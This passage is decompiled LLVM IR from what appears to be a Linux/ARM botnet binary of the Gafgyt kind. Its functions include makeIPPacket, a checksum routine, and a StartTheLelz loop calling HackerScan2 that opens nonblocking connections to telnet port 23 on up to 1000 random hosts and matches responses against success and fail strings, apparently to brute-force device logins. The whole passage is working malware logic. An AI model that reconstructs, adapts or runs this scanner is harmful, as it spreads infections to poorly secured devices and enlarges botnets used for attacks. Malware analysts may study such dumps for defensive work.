  %v2_db1c = inttoptr i32 %v1_db1c to i32*
  %v3_db1c = load i32, i32* %v2_db1c, align 4
  store i32 %v3_db1c, i32* %stack_var_-44, align 4
  %v1_db44 = call i32 @__GI_htons(i32 20)
  %v1_db60 = call i32 @malloc(i32 32)
  %v2_db6c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_db6c, i32* @r3, align 4
  store i32 %v1_db60, i32* @r0, align 4
  store i32 %v2_db6c, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_db7c = call i32 @memcpy()
  %v1_db84 = add i32 %v1_db60, 12
  store i32 %v1_db84, i32* @r3, align 4
  store i32 %v1_db84, i32* @r0, align 4
  %v3_db8c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_db8c, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_db94 = call i32 @memcpy()
  %v2_dba0 = inttoptr i32 %v1_db60 to i16*
  %v3_dba0 = call i32 @csum(i16* %v2_dba0, i32 32)
  %sext = mul i32 %v3_dba0, 65536
  %v1_dba4 = sdiv i32 %sext, 65536
  store i32 %v1_db60, i32* @r0, align 4
  %v0_dbb0 = call i32 @free()
  %v4_dbb4 = urem i32 %v1_dba4, 65536
  store i32 %v3_daf8, i32* @fp, align 4
  ret i32 %v4_dbb4

; uselistorder directives
  uselistorder i32 %v1_db60, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dbcc = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_dc38 = add i32 %tmp4, 1
  %v4_dc38 = inttoptr i32 %v3_dc38 to i8*
  store i8 0, i8* %v4_dc38, align 1
  %v3_dc3c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_dc3c, 20
  %v1_dc58 = trunc i32 %fold to i16
  %v3_dc58 = add i32 %tmp4, 2
  %v4_dc58 = inttoptr i32 %v3_dc58 to i16*
  store i16 %v1_dc58, i16* %v4_dc58, align 2
  %v0_dc5c = call i32 @rand_cmwc()
  %v1_dc70 = trunc i32 %v0_dc5c to i16
  %v3_dc70 = add i32 %tmp4, 4
  %v4_dc70 = inttoptr i32 %v3_dc70 to i16*
  store i16 %v1_dc70, i16* %v4_dc70, align 2
  %v3_dc7c = add i32 %tmp4, 6
  %v4_dc7c = inttoptr i32 %v3_dc7c to i16*
  store i16 0, i16* %v4_dc7c, align 2
  %v3_dc88 = add i32 %tmp4, 8
  %v4_dc88 = inttoptr i32 %v3_dc88 to i8*
  store i8 -1, i8* %v4_dc88, align 1
  %v3_dc94 = add i32 %tmp4, 9
  %v4_dc94 = inttoptr i32 %v3_dc94 to i8*
  store i8 %tmp, i8* %v4_dc94, align 1
  %v3_dca0 = add i32 %tmp4, 10
  %v4_dca0 = inttoptr i32 %v3_dca0 to i16*
  store i16 0, i16* %v4_dca0, align 2
  %v2_dcac = add i32 %tmp4, 12
  %v3_dcac = inttoptr i32 %v2_dcac to i32*
  store i32 %arg3, i32* %v3_dcac, align 4
  %v2_dcb8 = add i32 %tmp4, 16
  %v3_dcb8 = inttoptr i32 %v2_dcb8 to i32*
  store i32 %arg2, i32* %v3_dcb8, align 4
  store i32 %v3_dbcc, i32* @fp, align 4
  ret i32 %v0_dc5c
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_dce4 = icmp sgt i32 %arg1, 2
  br i1 %v8_dce4, label %dec_label_pc_dcf4, label %dec_label_pc_dd04

dec_label_pc_dcf4:                                ; preds = %entry
  %v1_dcf8 = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_dd04

dec_label_pc_dd04:                                ; preds = %entry, %dec_label_pc_dcf4
  %storemerge1 = phi i32 [ 0, %dec_label_pc_dcf4 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_dd04, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_dd1c = load i32, i32* @fp, align 4
  store i32 56612, i32* %stack_var_-4, align 4
  %v2_dd20 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd20, i32* @fp, align 4
  %v1_dd30 = add i32 %arg1, 4
  %v2_dd30 = inttoptr i32 %v1_dd30 to i32*
  %v3_dd30 = load i32, i32* %v2_dd30, align 4
  store i32 %v3_dd30, i32* @r0, align 4
  %v1_dd3c = call i32 @__GI_inet_ntoa(i32 %v3_dd30)
  store i32 %v3_dd1c, i32* @fp, align 4
  ret i32 %v1_dd3c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_dd58 = load i32, i32* @fp, align 4
  store i32 56672, i32* %stack_var_-4, align 4
  %v2_dd5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd5c, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_dd84 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_dd98 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_dda8 = load i8, i8* %arg3, align 1
  %v2_ddac = icmp eq i8 %v2_dda8, -1
  br i1 %v2_ddac, label %dec_label_pc_ddb4, label %dec_label_pc_ddc8

dec_label_pc_ddb4:                                ; preds = %entry
  %v4_ddc4 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_ddc8

dec_label_pc_ddc8:                                ; preds = %entry, %dec_label_pc_ddb4
  %v3_ddcc = load i32, i32* %stack_var_0, align 4
  %v3_ddd0 = call i32 @contains_string(i32 %tmp, i32 %v3_ddcc)
  %v2_ddd8 = icmp ne i32 %v3_ddd0, 0
  %. = zext i1 %v2_ddd8 to i32
  store i32 %v3_dd58, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_ddc8, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de4c.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_de0c = load i32, i32* @fp, align 4
  store i32 %v3_de0c, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_de38 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de4c.lr.ph, %dec_label_pc_de4c
  %storemerge25 = phi i32 [ 0, %dec_label_pc_de4c.lr.ph ], [ %v1_de60, %dec_label_pc_de4c ]
  %v5_de58 = mul nuw nsw i32 %storemerge25, 4
  %v6_de58 = add i32 %v5_de58, %v2_de38
  %v7_de58 = inttoptr i32 %v6_de58 to i32*
  store i32 0, i32* %v7_de58, align 4
  %v1_de60 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_de60, 32
  br i1 %tmp21, label %dec_label_pc_de4c, label %dec_label_pc_de74

dec_label_pc_de74:                                ; preds = %dec_label_pc_de4c
  %v13_de0c = ptrtoint i32* %stack_var_-16 to i32
  %v3_de78 = udiv i32 %arg1, 32
  %v3_de84 = mul nuw nsw i32 %v3_de78, 4
  %v2_de8c = add nsw i32 %v3_de84, -136
  %v2_de90 = add i32 %v2_de8c, %v13_de0c
  %v1_de94 = inttoptr i32 %v2_de90 to i32*
  %v2_de94 = load i32, i32* %v1_de94, align 4
  %v1_de9c = urem i32 %arg1, 32
  %v6_dea4 = shl i32 1, %v1_de9c
  %v2_dea8 = or i32 %v2_de94, %v6_dea4
  store i32 %v2_dea8, i32* %v1_de94, align 4
  %v1_dec8 = add i32 %arg1, 1
  %v2_ded0 = ptrtoint i32* %stack_var_-160 to i32
  %v5_dee4 = call i32 @__libc_select(i32 %v1_dec8, i32 %v2_de38, i32 0, i32 0, i32 %v2_ded0)
  %v5_def0 = icmp sgt i32 %v5_dee4, 0
  br i1 %v5_def0, label %dec_label_pc_df00, label %dec_label_pc_def4

dec_label_pc_def4:                                ; preds = %dec_label_pc_de74
  br label %dec_label_pc_df20

dec_label_pc_df00:                                ; preds = %dec_label_pc_de74
  %v5_df14 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_df20

dec_label_pc_df20:                                ; preds = %dec_label_pc_def4, %dec_label_pc_df00
  %storemerge = phi i32 [ %v5_df14, %dec_label_pc_df00 ], [ 0, %dec_label_pc_def4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_de38, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_df20, { 1, 0 }
  uselistorder label %dec_label_pc_de4c, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_df38 = load i32, i32* @fp, align 4
  %v3_df50 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_2c238.483 to i32))
  store i32 %v3_df38, i32* @fp, align 4
  ret i32 %v3_df50
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_df70 = load i32, i32* @fp, align 4
  %v3_df88 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2c218.492 to i32))
  store i32 %v3_df70, i32* @fp, align 4
  ret i32 %v3_df88

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_dfd4

dec_label_pc_dfd4:                                ; preds = %dec_label_pc_dfd4, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_dfd8, %dec_label_pc_dfd4 ]
  %v1_dfd8 = add i32 %stack_var_-24.0, 1
  %v3_dfe4 = mul i32 %v1_dfd8, 4
  %v2_dff0 = add i32 %v3_dfe4, %arg2
  %v1_dff4 = inttoptr i32 %v2_dff0 to i32*
  %v2_dff4 = load i32, i32* %v1_dff4, align 4
  %v2_dff8 = icmp eq i32 %v2_dff4, 0
  br i1 %v2_dff8, label %dec_label_pc_e054.preheader, label %dec_label_pc_dfd4

dec_label_pc_e054.preheader:                      ; preds = %dec_label_pc_dfd4
  %v3_e02c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_e054

dec_label_pc_e00c:                                ; preds = %dec_label_pc_e054
  %v3_e010 = mul i32 %storemerge2, 4
  %v2_e01c = add i32 %v3_e010, %arg2
  %v1_e020 = inttoptr i32 %v2_e01c to i32*
  %v2_e020 = load i32, i32* %v1_e020, align 4
  %v4_e02c = call i32 @strcasestr(i8* %v3_e02c, i32 %v2_e020, i32 %v3_e010)
  %v2_e034 = icmp eq i32 %v4_e02c, 0
  %v1_e04c = add nuw i32 %storemerge2, 1
  br i1 %v2_e034, label %dec_label_pc_e054, label %dec_label_pc_e06c

dec_label_pc_e054:                                ; preds = %dec_label_pc_e00c, %dec_label_pc_e054.preheader
  %storemerge2 = phi i32 [ %v1_e04c, %dec_label_pc_e00c ], [ 0, %dec_label_pc_e054.preheader ]
  %v5_e060 = icmp slt i32 %storemerge2, %v1_dfd8
  br i1 %v5_e060, label %dec_label_pc_e00c, label %dec_label_pc_e06c

dec_label_pc_e06c:                                ; preds = %dec_label_pc_e054, %dec_label_pc_e00c
  %storemerge = phi i32 [ 1, %dec_label_pc_e00c ], [ 0, %dec_label_pc_e054 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_dfd8, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e080 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e080, i32* %ip.global-to-local, align 4
  %v3_e084 = load i32, i32* @r4, align 4
  store i32 %v3_e084, i32* %stack_var_-24, align 4
  store i32 57484, i32* %stack_var_-4, align 4
  %v19_e084 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e088 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e088, i32* @fp, align 4
  %v2_e0ac = call i32 @__GI_time(i32* null)
  store i32 %v2_e0ac, i32* @r4, align 4
  %v0_e0b8 = call i32 @rand_cmwc()
  %v0_e0c0 = load i32, i32* @r4, align 4
  %v2_e0c0 = xor i32 %v0_e0c0, %v0_e0b8
  %v1_e0c8 = call i32 @srand(i32 %v2_e0c0)
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_e0dc = add i32 %v19_e084, -592
  %v5_e0dc = inttoptr i32 %v4_e0dc to i16*
  store i16 2, i16* %v5_e0dc, align 4
  %v1_e0e4 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_e114 = bitcast i32* %stack_var_-608 to i8*
  %v3_e114 = call i32 @__GI_memset(i8* %v2_e114, i32 0)
  %v1_e120 = call i32 @malloc(i32 1025)
  store i32 1025, i32* @r2, align 4
  %v2_e13c = inttoptr i32 %v1_e120 to i8*
  %v3_e13c = call i32 @__GI_memset(i8* %v2_e13c, i32 0)
  %v1_e160 = load i32, i32* @sp, align 4
  %v1_e170 = add i32 %v1_e160, -27993
  %v3_e174 = and i32 %v1_e170, -8
  store i32 5000, i32* @r2, align 4
  %v2_e1a8 = inttoptr i32 %v3_e174 to i8*
  %v3_e1a8 = call i32 @__GI_memset(i8* %v2_e1a8, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1b8

dec_label_pc_e1b8:                                ; preds = %entry, %dec_label_pc_e1b8
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_e234, %dec_label_pc_e1b8 ]
  %v2_e1c8 = mul nuw nsw i32 %storemerge514, 28
  %v2_e1cc = add i32 %v2_e1c8, %v3_e174
  store i32 28, i32* @r2, align 4
  %v2_e1dc = inttoptr i32 %v2_e1cc to i8*
  %v3_e1dc = call i32 @__GI_memset(i8* %v2_e1dc, i32 0)
  %v3_e204 = add i32 %v2_e1cc, 9
  %v4_e204 = inttoptr i32 %v3_e204 to i8*
  store i8 1, i8* %v4_e204, align 1
  %v2_e224 = add i32 %v2_e1cc, 24
  %v2_e22c = inttoptr i32 %v2_e224 to i32*
  store i32 %v1_e120, i32* %v2_e22c, align 4
  %v1_e234 = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_e234, i32* %r2.global-to-local, align 4
  %v5_e248 = icmp slt i32 %v1_e234, 1000
  br i1 %v5_e248, label %dec_label_pc_e1b8, label %dec_label_pc_e24c.preheader

dec_label_pc_e24c.preheader:                      ; preds = %dec_label_pc_e1b8
  %v2_e2d4 = add i32 %v3_e174, 8
  %v2_e5d4 = or i32 %v3_e174, 4
  %v2_e6b4 = ptrtoint i32* %stack_var_-616 to i32
  %v2_e78c = ptrtoint i32* %stack_var_-328 to i32
  %v2_e888 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e8e4 = ptrtoint i32* %stack_var_-344 to i32
  %v2_e8e8 = ptrtoint i32* %stack_var_-340 to i32
  %v2_ea50 = add i32 %v3_e174, 24
  %v2_f5b8 = add i32 %v3_e174, 16
  br label %dec_label_pc_e24c

dec_label_pc_e24c:                                ; preds = %dec_label_pc_f7ec, %dec_label_pc_e24c.preheader
  br label %dec_label_pc_e258

dec_label_pc_e258:                                ; preds = %dec_label_pc_e24c, %dec_label_pc_f7ec
  %storemerge612 = phi i32 [ 0, %dec_label_pc_e24c ], [ %v1_f7f0, %dec_label_pc_f7ec ]
  %v3_e264 = mul i32 %storemerge612, 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e26c = mul nuw nsw i32 %storemerge612, 28
  %v2_e270 = add i32 %v2_e26c, %v3_e174
  %v2_e274 = add i32 %v2_e270, 16
  %v1_e278 = inttoptr i32 %v2_e274 to i32*
  %v2_e278 = load i32, i32* %v1_e278, align 4
  %v2_e27c = icmp eq i32 %v2_e278, 0
  br i1 %v2_e27c, label %dec_label_pc_e284, label %dec_label_pc_e2bc

dec_label_pc_e284:                                ; preds = %dec_label_pc_e258
  store i32 %storemerge612, i32* @r4, align 4
  %v2_e28c = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e2a0 = load i32, i32* @r4, align 4
  %v3_e2a4 = mul i32 %v0_e2a0, 4
  store i32 %v3_e2a4, i32* %r2.global-to-local, align 4
  %v2_e2ac = mul i32 %v0_e2a0, 28
  %v2_e2b4 = add i32 %v2_f5b8, %v2_e2ac
  %v2_e2b8 = inttoptr i32 %v2_e2b4 to i32*
  store i32 %v2_e28c, i32* %v2_e2b8, align 4
  br label %dec_label_pc_e2bc

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e258, %dec_label_pc_e284
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e2d8 = add i32 %v2_e2d4, %v2_e26c
  %v1_e2dc = inttoptr i32 %v2_e2d8 to i8*
  %v2_e2dc = load i8, i8* %v1_e2dc, align 4
  %v3_e2dc = sext i8 %v2_e2dc to i32
  switch i32 %v3_e2dc, label %dec_label_pc_f7ec [
    i32 0, label %dec_label_pc_e30c
    i32 1, label %dec_label_pc_e7a0.lr.ph
    i32 2, label %dec_label_pc_ebd0
    i32 3, label %dec_label_pc_ed54
    i32 4, label %dec_label_pc_ef0c
    i32 5, label %dec_label_pc_f090
    i32 6, label %dec_label_pc_f248
    i32 7, label %dec_label_pc_f630
  ]

dec_label_pc_e30c:                                ; preds = %dec_label_pc_e2bc
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e328 = add i32 %v2_e270, 8
  %v1_e32c = add i32 %v2_e270, 9
  %v2_e32c = inttoptr i32 %v1_e32c to i8*
  %v3_e32c = load i8, i8* %v2_e32c, align 1
  %v7_e330 = icmp eq i8 %v3_e32c, 1
  br i1 %v7_e330, label %dec_label_pc_e338, label %dec_label_pc_e3e4

dec_label_pc_e338:                                ; preds = %dec_label_pc_e30c
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e354 = add i32 %v2_e270, 24
  %v1_e358 = inttoptr i32 %v2_e354 to i32*
  %v2_e358 = load i32, i32* %v1_e358, align 4
  store i32 28, i32* @r2, align 4
  %v2_e384 = inttoptr i32 %v2_e270 to i8*
  %v3_e384 = call i32 @__GI_memset(i8* %v2_e384, i32 0)
  store i32 %v2_e354, i32* %r2.global-to-local, align 4
  store i32 %v2_e358, i32* %v1_e358, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_e3b4 = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e3c4 = load i32, i32* @r4, align 4
  %v3_e3c8 = mul i32 %v0_e3c4, 4
  store i32 %v3_e3c8, i32* %r2.global-to-local, align 4
  %v2_e3d0 = mul i32 %v0_e3c4, 28
  %v2_e3d8 = add i32 %v2_e5d4, %v2_e3d0
  %v2_e3dc = inttoptr i32 %v2_e3d8 to i32*
  store i32 %v1_e3b4, i32* %v2_e3dc, align 4
  br label %dec_label_pc_e570

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e30c
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_e404 = load i8, i8* %v2_e32c, align 1
  %v2_e408 = icmp eq i8 %v3_e404, 0
  br i1 %v2_e408, label %dec_label_pc_e410, label %dec_label_pc_e570

dec_label_pc_e410:                                ; preds = %dec_label_pc_e3e4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_e434 = add i32 %v2_e270, 11
  %v2_e434 = inttoptr i32 %v1_e434 to i8*
  %v3_e434 = load i8, i8* %v2_e434, align 1
  %v1_e438 = add i8 %v3_e434, 1
  store i8 %v1_e438, i8* %v2_e434, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_e48c = add i32 %v2_e270, 10
  %v2_e48c = inttoptr i32 %v1_e48c to i8*
  %v3_e48c = load i8, i8* %v2_e48c, align 2
  %v1_e490 = add i8 %v3_e48c, 1
  store i32 %v3_e174, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_e490, i8* %v2_e48c, align 2
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v3_e4e0 = load i8, i8* %v2_e434, align 1
  %v7_e4e4 = icmp eq i8 %v3_e4e0, 3
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  br i1 %v7_e4e4, label %dec_label_pc_e4ec, label %dec_label_pc_e518

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e410
  store i32 %v2_e328, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e32c, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_e518:                                ; preds = %dec_label_pc_e410
  %v3_e538 = load i8, i8* %v2_e48c, align 2
  %v7_e53c = icmp eq i8 %v3_e538, 3
  br i1 %v7_e53c, label %dec_label_pc_e544, label %dec_label_pc_e570

dec_label_pc_e544:                                ; preds = %dec_label_pc_e518
  store i32 %v2_e328, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e32c, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_e570:                                ; preds = %dec_label_pc_e518, %dec_label_pc_e3e4, %dec_label_pc_e338
  store i32 2, i32* %r2.global-to-local, align 4
  store i16 2, i16* %v5_e0dc, align 4
  %v1_e588 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_e5b8 = call i32 @__GI_memset(i8* %v2_e114, i32 0)
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e5f4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_e5fc = load i32, i32* @r4, align 4
  %v2_e608 = mul i32 %v0_e5fc, 28
  %v2_e60c = add i32 %v2_e608, %v3_e174
  %v2_e610 = inttoptr i32 %v2_e60c to i32*
  store i32 %v3_e5f4, i32* %v2_e610, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_e62c = inttoptr i32 %v2_e270 to i32*
  %v2_e62c = load i32, i32* %v1_e62c, align 4
  %v7_e630 = icmp eq i32 %v2_e62c, -1
  br i1 %v7_e630, label %dec_label_pc_f7ec, label %dec_label_pc_e638

dec_label_pc_e638:                                ; preds = %dec_label_pc_e570
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e650 = load i32, i32* %v1_e62c, align 4
  store i32 %v2_e650, i32* @r4, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e66c = load i32, i32* %v1_e62c, align 4
  store i32 %v2_e66c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e67c = call i32 @__libc_fcntl(i32 %v2_e66c, i32 3)
  %v1_e684 = or i32 %v2_e67c, 2048
  store i32 %v1_e684, i32* @r3, align 4
  %v0_e688 = load i32, i32* @r4, align 4
  store i32 %v1_e684, i32* %r2.global-to-local, align 4
  %v2_e694 = call i32 @__libc_fcntl(i32 %v0_e688, i32 4)
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e6b0 = load i32, i32* %v1_e62c, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e6c4 = call i32 @__libc_connect(i32 %v2_e6b0, i32 %v2_e6b4, i32 16)
  %v3_e6cc = icmp eq i32 %v3_e6c4, -1
  br i1 %v3_e6cc, label %dec_label_pc_e6d4, label %dec_label_pc_e738

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e638
  %v0_e6d4 = call i32 @__GI___errno_location()
  %v1_e6dc = inttoptr i32 %v0_e6d4 to i32*
  %v2_e6dc = load i32, i32* %v1_e6dc, align 4
  %v7_e6e0 = icmp eq i32 %v2_e6dc, 115
  br i1 %v7_e6e0, label %dec_label_pc_e738, label %dec_label_pc_e6e8

dec_label_pc_e6e8:                                ; preds = %dec_label_pc_e6d4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e700 = load i32, i32* %v1_e62c, align 4
  %v3_e708 = call i32 @sclose(i32 %v2_e700, i32 %v3_e174, i32 %v3_e264)
  store i32 %v2_e328, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e32c, align 1
  br label %dec_label_pc_f7ec

dec_label_pc_e738:                                ; preds = %dec_label_pc_e638, %dec_label_pc_e6d4
  %v3_e75c = inttoptr i32 %v2_e328 to i8*
  store i8 1, i8* %v3_e75c, align 4
  store i32 %v2_e274, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v1_e278, align 4
  br label %dec_label_pc_f7ec

dec_label_pc_e7a0.lr.ph:                          ; preds = %dec_label_pc_e2bc
  br label %dec_label_pc_e7a0

dec_label_pc_e7a0:                                ; preds = %dec_label_pc_e7a0.lr.ph, %dec_label_pc_e7a0
  %storemerge711 = phi i32 [ 0, %dec_label_pc_e7a0.lr.ph ], [ %v1_e7b4, %dec_label_pc_e7a0 ]
  store i32 %v2_e78c, i32* %r2.global-to-local, align 4
  %v5_e7ac = mul nuw nsw i32 %storemerge711, 4
  %v6_e7ac = add i32 %v5_e7ac, %v2_e78c
  %v7_e7ac = inttoptr i32 %v6_e7ac to i32*
  store i32 0, i32* %v7_e7ac, align 4
  %v1_e7b4 = add nuw nsw i32 %storemerge711, 1
  %tmp43 = icmp ult i32 %v1_e7b4, 32
  br i1 %tmp43, label %dec_label_pc_e7a0, label %dec_label_pc_e7c8

dec_label_pc_e7c8:                                ; preds = %dec_label_pc_e7a0
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v1_e7e0 = inttoptr i32 %v2_e270 to i32*
  %v2_e7e0 = load i32, i32* %v1_e7e0, align 4
  %v3_e7e4 = udiv i32 %v2_e7e0, 32
  %v3_e7f8 = mul nuw nsw i32 %v3_e7e4, 4
  %v2_e800 = add i32 %v3_e7f8, %v19_e084
  store i32 %v2_e800, i32* %r2.global-to-local, align 4
  %v2_e804 = add i32 %v2_e800, -304
  %v1_e808 = inttoptr i32 %v2_e804 to i32*
  %v2_e808 = load i32, i32* %v1_e808, align 4
  store i32 %v2_e808, i32* %ip.global-to-local, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e824 = load i32, i32* %v1_e7e0, align 4
  %v1_e828 = urem i32 %v2_e824, 32
  %v6_e830 = shl i32 1, %v1_e828
  %v2_e834 = or i32 %v6_e830, %v2_e808
  store i32 %v2_e834, i32* %v1_e808, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e87c = load i32, i32* %v1_e7e0, align 4
  %v1_e880 = add i32 %v2_e87c, 1
  store i32 %v1_e880, i32* %r2.global-to-local, align 4
  store i32 %v2_e78c, i32* %ip.global-to-local, align 4
  %v1_e88c = load i32, i32* @sp, align 4
  %v2_e88c = inttoptr i32 %v1_e88c to i32*
  store i32 %v2_e888, i32* %v2_e88c, align 4
  %v0_e890 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e78c, i32* %r2.global-to-local, align 4
  %v4_e8a0 = load i32, i32* %stack_var_-336, align 4
  %v5_e8a0 = call i32 @__libc_select(i32 %v0_e890, i32 0, i32 %v2_e78c, i32 0, i32 %v4_e8a0)
  %v7_e8b0 = icmp eq i32 %v5_e8a0, 1
  br i1 %v7_e8b0, label %dec_label_pc_e8b8, label %dec_label_pc_ea98

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e7c8
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_e264, i32* %r2.global-to-local, align 4
  %v2_e8e0 = load i32, i32* %v1_e7e0, align 4
  store i32 %v2_e8e0, i32* %r2.global-to-local, align 4
  store i32 %v2_e8e4, i32* %ip.global-to-local, align 4
  %v1_e8ec = load i32, i32* @sp, align 4
  %v2_e8ec = inttoptr i32 %v1_e8ec to i32*
  store i32 %v2_e8e8, i32* %v2_e8ec, align 4
  %v0_e8f0 = load i32, i32* %r2.global-to-local, align 4
